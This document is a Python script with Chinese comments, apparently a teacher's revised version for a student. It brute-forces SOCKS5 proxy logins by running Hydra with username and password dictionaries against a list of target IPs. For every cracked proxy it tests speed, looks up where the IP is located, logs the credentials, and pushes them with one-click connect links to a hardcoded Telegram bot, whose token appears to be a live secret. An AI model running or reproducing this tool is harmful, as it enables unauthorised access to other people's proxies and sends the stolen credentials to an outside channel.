import subprocess
import requests
import time
import socket
import socks
import re
import os

# ================= 配置区域 =================
# Telegram Bot 配置
TG_BOT_TOKEN = "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY"
TG_CHAT_ID = "6977085303"

# 文件路径
SOCKS_FILE = "socks.txt"    # IP列表
USER_FILE = "users.txt"     # 用户名字典
PASS_FILE = "pass.txt"      # 密码字典
LOG_FILE = "success_proxies.log"
# ===========================================

def send_telegram(message):
    """发送消息到 Telegram"""
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        requests.post(url, data=data, timeout=5)
    except Exception as e:
        print(f"[-] TG 推送失败: {e}")

def get_ip_info(ip):
    """查询 IP 归属地"""
    try:
        url = f"http://ip-api.com/json/{ip}?lang=zh-CN"
        resp = requests.get(url, timeout=5).json()
        if resp['status'] == 'success':
            return {
                "country": resp.get('country', '未知'),
                "region": resp.get('regionName', '未知'),
                "city": resp.get('city', '未知'),
                "isp": resp.get('isp', '未知'),
            }
    except:
        pass
    return {"country": "未知", "region": "", "city": "", "isp": "未知"}

def test_proxy_speed(ip, port, user, password):
    """测试代理连接延迟和下载速度"""
    print(f"[*] 正在验证有效性并测速: {ip} ...")
    
    # 手动备份原始 socket 类
    original_socket = socket.socket
    
    start_time = time.time()
    latency = None
    speed = None
    
    try:
        # 设置全局代理
        socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        socket.socket = socks.socksocket
        
        # 1. 测试延迟 (请求 Google)
        requests.get("http://www.google.com/generate_204", timeout=5)
        latency = (time.time() - start_time) * 1000  # 毫秒
        
        # 2. 简单的下载测速
        dl_start = time.time()
        requests.get("https://speed.cloudflare.com/__down?bytes=500000", timeout=10)
        dl_time = time.time() - dl_start
        speed = (500 / dl_time) # KB/s
        
    except Exception:
        return None, None
    finally:
        # 无论成功失败，必须还原 socket
        socks.set_default_proxy()
        socket.socket = original_socket 
    
    return latency, speed

def format_speed(speed_kb):
    if speed_kb is None: return "N/A"
    if speed_kb > 5000: return f"{speed_kb:.2f} kb/s(起飞)"
    if speed_kb > 2000: return f"{speed_kb:.2f} kb/s(极快)"
    if speed_kb > 500: return f"{speed_kb:.2f} kb/s(流畅)"
    return f"{speed_kb:.2f} kb/s(一般)"

def run_hydra(ip, port):
    """调用 Hydra 进行爆破"""
    
    # 老师增加了 -t 4 (因为你说卡住，可能是并发太高把网络堵死了，先降回4测试)
    # -w 5: 连接超时5秒
    cmd = [
        "hydra", 
        "-L", USER_FILE, 
        "-P", PASS_FILE, 
        "-s", port,
        "-t", "4",    
        "-w", "5",    
        "-f",         
        "-I",         
        f"socks5://{ip}"
    ]
    
    try:
        # 这里没有 timeout，Python 会一直等到 Hydra 进程结束
        # 如果 Hydra 卡住，脚本就会卡住
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        full_log = result.stdout + result.stderr
        
        # 1. 检查是否成功
        match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", result.stdout)
        if match:
            return match.group(1), match.group(2), "Success"
        
        # 2. 分析失败原因
        if "Connection refused" in full_log:
            return None, None, "连接被拒绝"
        elif "Connection timed out" in full_log:
            return None, None, "连接超时"
        elif "Could not connect" in full_log:
             return None, None, "无法建立连接"
        else:
            return None, None, "字典耗尽 (未命中)"

    except Exception as e:
        return None, None, f"脚本错误: {str(e)}"

def main():
    if not os.path.exists(SOCKS_FILE):
        print(f"找不到 {SOCKS_FILE}")
        return

    valid_targets = []
    with open(SOCKS_FILE, 'r') as f:
        raw_lines = f.readlines()
        for line in raw_lines:
            line = line.strip()
            if line and ":" in line:
                valid_targets.append(line)

    total_count = len(valid_targets)
    if total_count == 0:
        print("[-] socks.txt 是空的")
        return

    print(f"[*] 读取到 {total_count} 个待扫描目标，任务开始...")

    for index, target in enumerate(valid_targets):
        current_num = index + 1
        progress_percent = (current_num / total_count) * 100
        
        ip, port = target.split(":")
        
        prefix = f"[进度: {current_num}/{total_count} | {progress_percent:.1f}%]"
        # 这里使用了 end='' 让它不换行，或者直接打印出来
        print(f"{prefix} 正在爆破: {ip}:{port} (请耐心等待)...")
        
        # === 【关键修复点】 ===
        # 这里必须接收 3 个变量！之前你只写了 user, pwd
        user, pwd, reason = run_hydra(ip, port)
        
        if user and pwd:
            print(f"[+] 成功抓获: {ip}:{port} -> {user}:{pwd}")
            
            latency, speed = test_proxy_speed(ip, port, user, pwd)

            if latency is None:
                print("[-] 账号正确但代理无法连通外网，跳过。")
                continue
            
            info = get_ip_info(ip)
            lat_str = f"{latency:.2f} ms"
            speed_str = format_speed(speed)
            
            msg = (
                f"<b>【获取到socks5】</b>\n"
                f"IP：<code>{ip}</code>\n"
                f"端口：<code>{port}</code>\n"
                f"账号：<code>{user}</code>\n"
                f"密码：<code>{pwd}</code>\n\n"
                f"<code>socks5://{user}:{pwd}@{ip}:{port}</code>\n\n"
                f"<a href='https://t.me/socks?server={ip}&port={port}&user={user}&pass={pwd}'>TG一键连接链接</a>\n"
                f"延迟: {lat_str} | 下载速度: {speed_str}\n"
                f"进度: {current_num}/{total_count} ({progress_percent:.1f}%)\n"
                f"【归属地：{info['country']} {info['region']} {info['city']}】-【运营商：{info['isp']}】"
            )
            
            with open(LOG_FILE, "a", encoding="utf-8") as lf:
                lf.write(f"socks5://{user}:{pwd}@{ip}:{port}\n")
            
            send_telegram(msg)
            print(f"[+] 消息已推送")
        
        else:
            # 打印失败原因
            print(f"[-] 失败: {ip}:{port} -> {reason}")

if __name__ == "__main__":
    print("--- 老师带你起飞 2.0 (终极修复版) ---")
    main()
